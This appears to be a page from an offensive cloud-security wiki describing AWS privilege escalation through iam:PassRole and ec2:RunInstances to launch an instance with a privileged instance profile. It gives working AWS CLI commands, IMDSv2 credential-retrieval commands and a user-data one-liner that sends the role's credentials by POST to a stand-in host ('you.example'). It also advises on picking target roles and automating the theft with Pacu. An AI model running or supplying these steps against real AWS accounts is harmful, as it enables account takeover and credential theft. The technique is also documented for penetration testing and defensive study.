---
title: "EC2: PassRole to RunInstances for a privileged instance profile"
description: "iam:PassRole with ec2:RunInstances to launch an instance carrying a privileged instance profile, then read its role credentials from the metadata service."
keywords:
  - PassRole
  - RunInstances
  - instance profile
  - EC2
  - IMDS
---

# EC2

With `iam:PassRole` and `ec2:RunInstances` (plus `iam:PassRole` on a role whose trust policy allows `ec2.amazonaws.com`), you launch an instance that carries a privileged **instance profile**. Once it boots, the instance metadata service hands out that role's credentials, and you read them because you control the instance.

## Launching with a passed role

```bash
# the instance profile wraps the privileged role
aws ec2 run-instances \
  --image-id ami-xxxxxxxx --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --key-name <yourkey> --security-group-ids <sg>
```

If you do not need network access to the box, pass a **user-data** script that exfiltrates the credentials to you on boot, so you never need SSH:

```bash
aws ec2 run-instances --image-id ami-xxxx --instance-type t3.micro \
  --iam-instance-profile Name=<privileged-instance-profile> \
  --user-data "$(printf '#!/bin/bash\ncurl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> | curl -X POST -d @- https://you.example')"
```

## Reading the credentials on the instance

```bash
# IMDSv2 token then the role credentials
TOKEN=$(curl -sX PUT http://169.254.169.254/latest/api/token -H 'X-aws-ec2-metadata-token-ttl-seconds: 60')
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>
```

Those keys are the privileged role's; export them and continue as that role.

## Exploitation notes

- The role's trust policy must allow EC2; roles built as instance profiles already do, so any instance-profile role in the account is a candidate.
- Prefer the user-data exfiltration variant in a locked-down VPC where you cannot reach the instance directly.
- See [instance metadata](../../../credentials/instance-metadata/index.md) for the IMDSv1/v2 and SSRF retrieval detail, and [EC2 user data](../../../compute/ec2/user-data.md) for the boot-script path in depth.

## Tools

- **AWS CLI** (`ec2 run-instances`): the launch itself.
- **Pacu** (`ec2__startup_shell_script`): automates the user-data credential-steal variant.

## References

- [Rhino Security Labs: AWS privilege escalation (PassRole to EC2)](https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/)
- [BishopFox: iam-vulnerable PassRole scenarios](https://github.com/BishopFox/iam-vulnerable)
- [Pacu (Rhino Security Labs)](https://github.com/RhinoSecurityLabs/pacu)
- [Hacking the Cloud: AWS](https://hackingthe.cloud/)
